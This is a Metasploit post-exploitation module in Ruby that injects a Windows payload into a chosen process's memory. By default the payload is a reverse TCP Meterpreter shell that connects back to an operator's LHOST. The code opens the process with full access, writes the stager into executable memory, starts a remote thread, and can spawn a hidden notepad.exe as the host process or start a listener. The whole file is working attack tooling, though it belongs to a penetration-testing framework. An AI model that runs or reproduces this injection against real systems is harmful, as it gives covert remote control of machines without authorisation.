##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Memory Payload Injection Module',
      'Description'   => %q{
        This module will inject into the memory of a process a specified windows payload.
        If a payload or process is not provided one will be created by default
        using a reverse x86 TCP Meterpreter Payload.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('PAYLOAD',
          [false, 'Windows Payload to inject into memory of a process.',
            "windows/meterpreter/reverse_tcp"]),
        OptAddress.new('LHOST',
          [true, 'IP of host that will receive the connection from the payload.']),
        OptInt.new('LPORT',
          [false, 'Port for Payload to connect to.', 4433]),
        OptInt.new('PID',
          [false, 'Process Identifier to inject of process to inject payload.']),
        OptBool.new('HANDLER',
          [ false, 'Start an Exploit Multi Handler to receive the connection', false]),
        OptString.new('OPTIONS',
        [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",
          ""])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    # Check that the payload is a Windows one and on the list
    if not  session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
      return
    end

    # Set variables
    pay_name = datastore['PAYLOAD']
    lhost    = datastore['LHOST']
    lport    = datastore['LPORT']
    pid      = datastore['PID']
    opts     = datastore['OPTIONS']
    # Create payload
    payload = create_payload(pay_name,lhost,lport,opts)
    if pid == 0 or not has_pid?(pid)
      pid = create_temp_proc(payload)
    end
    if payload.arch.join =~ /64/ and client.platform =~ /x86/
      print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
      print_error("Migrate to an x64 process and try again.")
      return false
    else
      create_multihand(payload,pay_name,lhost,lport) if datastore['HANDLER']
      inject_into_pid(payload,pid,datastore['NEWPROCESS'])
    end
  end

  # Method for checking if a listner for a given IP and port is present
  # will return true if a conflict exists and false if none is found
  def check_for_listner(lhost,lport)
    conflict = false
    client.framework.jobs.each do |k,j|
      if j.name =~ / multi\/handler/
        current_id = j.jid
        current_lhost = j.ctx[0].datastore["LHOST"]
        current_lport = j.ctx[0].datastore["LPORT"]
        if lhost == current_lhost and lport == current_lport.to_i
          print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
          conflict = true
        end
      end
    end
    return conflict
  end

  # Create a payload given a name, lhost and lport, additional options
  def create_payload(name, lhost, lport, opts = "")
    pay = client.framework.payloads.create(name)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    if not opts.empty?
      opts.split(",").each do |o|
        opt,val = o.split("=",2)
        pay.datastore[opt] = val
      end
    end
    # Validate the options for the module
    pay.options.validate(pay.datastore)
    return pay
  end

  # Starts a multi/handler session
  def create_multihand(pay,pay_name,lhost,lport)
    print_status("Starting exploit multi handler")
    if not check_for_listner(lhost,lport)
      # Set options for module
      mul = client.framework.exploits.create("multi/handler")
      mul.share_datastore(pay.datastore)
      mul.datastore['WORKSPACE'] = client.workspace
      mul.datastore['PAYLOAD'] = pay_name
      mul.datastore['EXITFUNC'] = 'thread'
      mul.datastore['ExitOnSession'] = false
      # Validate module options
      mul.options.validate(mul.datastore)
      # Execute showing output
      mul.exploit_simple(
          'Payload'     => mul.datastore['PAYLOAD'],
          'LocalInput'  => self.user_input,
          'LocalOutput' => self.user_output,
          'RunAsJob'    => true
        )
    else
      print_error("Could not start handler!")
    end
  end

  # Checks the Architeture of a Payload and PID are compatible
  # Returns true if they are false if they are not
  def arch_check(pay,pid)
    # get the pid arch
    client.sys.process.processes.each do |p|
      # Check Payload Arch
      if pid == p["pid"]
        print_status("Process found checking Architecture")
        if pay.arch.join == p['arch']
          print_good("Process is the same architecture as the payload")
          return true
        else
          print_error("The PID #{ p['arch']} and Payload #{pay.arch.join} architectures are different.")
          return false
        end
      end
    end
  end

  # Creates a temp notepad.exe to inject payload in to given the payload
  # Returns process PID
  def create_temp_proc(pay)
    # Use the system path for executable to run
    cmd = "notepad.exe"
    # run hidden
    proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
    return proc.pid
  end

  def inject_into_pid(pay,pid,newproc)
    print_status("Performing Architecture Check")
    # If architecture check fails and a new process is wished to inject to one with the proper arch
    # will be created
    if arch_check(pay,pid)
      pid = create_temp_proc(pay) if newproc
      print_status("Injecting #{pay.name} into process ID #{pid}")
      begin
        print_status("Opening process #{pid}")
        host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
        print_status("Generating payload")
        raw = pay.generate
        print_status("Allocating memory in procees #{pid}")
        mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
        # Ensure memory is set for execution
        host_process.memory.protect(mem)
        print_status("Allocated memory at address #{"0x%.8x" % mem}, for #{raw.length} byte stager")
        print_status("Writing the stager into memory...")
        host_process.memory.write(mem, raw)
        host_process.thread.create(mem, 0)
        print_good("Successfully injected payload in to process: #{pid}")
      rescue ::Exception => e
        print_error("Failed to Inject Payload to #{pid}!")
        print_error(e.to_s)
      end
    end
  end
end
